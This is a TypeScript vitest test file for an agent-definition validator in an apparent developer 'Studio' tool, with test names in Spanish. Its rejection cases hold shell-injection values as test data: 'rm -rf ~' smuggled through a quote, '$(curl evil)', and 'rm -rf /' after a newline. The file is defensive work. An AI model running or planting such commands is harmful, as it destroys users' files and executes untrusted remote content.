import { mkdirSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { AgentError, listAgents, saveAgent, validateAgent } from "./agents.ts";
import type { Config } from "./config.ts";
import type { AgentDef } from "../shared/types.ts";

let home: string;
let cfg: Config;
const base: AgentDef = {
  id: "seguridad", name: "Seguridad", description: "Busca fallos de seguridad", engine: "claude", model: "",
  access: "read", verify: "", input: "diff", prompt: "Revisa el diff buscando inyecciones y secretos.",
};
const v = (over: Partial<AgentDef>) => validateAgent({ ...base, ...over }, ["gpt-oss:20b"]);

beforeEach(() => {
  home = mkdtempSync(join(tmpdir(), "studio-agents-"));
  mkdirSync(join(home, "agents"));
  mkdirSync(join(home, "prompts/agents"), { recursive: true });
  cfg = { aiHome: home } as Config;
});
afterEach(() => rmSync(home, { recursive: true, force: true }));

describe("agentes", () => {
  it("guarda y vuelve a leer una definición", () => {
    saveAgent(cfg, v({}), "create");
    expect(listAgents(cfg)).toEqual([{ ...base, prompt: base.prompt + "\n" }]);
    expect(() => saveAgent(cfg, v({}), "create")).toThrow(/Ya existe/);
  });

  it("bin/ai lee lo que escribe el Studio (agent_field, sin ejecutar el archivo)", () => {
    saveAgent(cfg, v({ id: "lint", engine: "aider", access: "write", input: "", verify: "npm run lint -- --max-warnings 0" }), "create");
    const sedField = (key: string) => execFileSync("sed", ["-n", "-E",
      `s/^${key}=['"]?([^'"]*)['"]?[[:space:]]*(#.*)?$/\\1/p`, join(home, "agents/lint.env")], { encoding: "utf8" }).trim();
    expect(sedField("AGENT_VERIFY")).toBe("npm run lint -- --max-warnings 0");
    expect(sedField("AGENT_ENGINE")).toBe("aider");
    expect(readFileSync(join(home, "prompts/agents/lint.md"), "utf8")).toContain("inyecciones");
  });

  it.each([
    ["claude con escritura", { access: "write" }],
    ["id con mayúsculas o ruta", { id: "../x" }],
    ["nombre con comilla (rompería el archivo)", { name: "a' ; rm -rf ~ ; '" }],
    ["descripción con $()", { description: "$(curl evil)" }],
    ["verificación en un agente claude", { verify: "npm test" }],
    ["entrada diff en un agente aider", { engine: "aider", access: "write" }],
    ["modelo de Ollama no descargado", { engine: "aider", access: "write", input: "", model: "llama3:70b" }],
    ["modelo de Claude raro", { model: "gpt-4" }],
    ["instrucciones vacías", { prompt: "  " }],
    ["verificación con salto de línea", { engine: "aider", access: "write", input: "", verify: "npm test\nrm -rf /" }],
  ])("rechaza %s", (_, over) => {
    expect(() => v(over as Partial<AgentDef>)).toThrow(AgentError);
  });
});
